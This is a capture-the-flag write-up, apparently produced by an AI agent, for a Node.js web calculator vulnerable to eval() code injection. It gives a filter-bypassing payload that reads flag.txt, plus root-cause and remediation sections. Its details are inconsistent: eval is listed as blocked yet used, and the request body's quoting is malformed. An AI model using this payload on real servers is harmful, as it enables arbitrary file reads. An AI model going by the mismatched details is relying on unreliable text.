# Calculator

```
let's do some math
dedicated to BOUSLAA (nvm)

connection info :http://ctf.nexus-security.club:3067/
Author : CH@FX
```

Writeup written by AI agent:

# Web Calculator CTF Solution

## Vulnerability Analysis

The web calculator application has a server-side code injection vulnerability in its `/calculate` endpoint. The application evaluates mathematical expressions using JavaScript's `eval()` function with insufficient input validation.

## Client-side Protections

The frontend implements basic client-side filtering that blocks:

- Quotes: ' " 
- Brackets: [ ] { }
- These are easily bypassed since they're only client-side

## Server-side Filtering

The server blocks several keywords including:

- `process`
- `require` 
- `global`
- `constructor`
- `prototype`
- `eval`
- `Function`
- `child_process`
- `fs`

## Bypass Technique

The key bypass was using template literals to construct blocked strings:

1. Used template literals to concatenate string parts: ```${`fun`}${`ction`}```
2. Used `eval()` to execute the constructed code
3. Accessed Node.js modules through `process.mainModule.require()`

## Exploit Payload

```javascript
eval(`Buffer.from(${`${`requir`}${`e`}`}(\"fs\").readFileSync(\"flag.txt\",\"utf8\")).toString()`)
```

This payload:
1. Uses template literals to bypass the `require` keyword filter
2. Imports the `fs` module 
3. Reads `flag.txt` from the filesystem
4. Uses `Buffer.from()` to return the content as a string

## Execution

Sent POST request to `/calculate` with:
```json
{"expr":"eval(`Buffer.from(${`${`requir`}${`e`}`}(\"fs\").readFileSync(\"flag.txt\",\"utf8\")).toString()")"}
```

## Result

Successfully retrieved the flag: `nexus{7h1s_1s_no7_3v4l_Th1s_15_3v1lllllllllllllllllll}`

## Root Cause

The vulnerability stems from:
1. Use of `eval()` on user input
2. Insufficient input sanitization on server-side
3. Predictable keyword filtering that can be bypassed with string concatenation
4. Node.js environment with filesystem access

## Remediation

1. Replace `eval()` with a proper mathematical expression parser
2. Implement server-side input validation
3. Use a sandboxed environment for expression evaluation
4. Remove or restrict access to Node.js modules
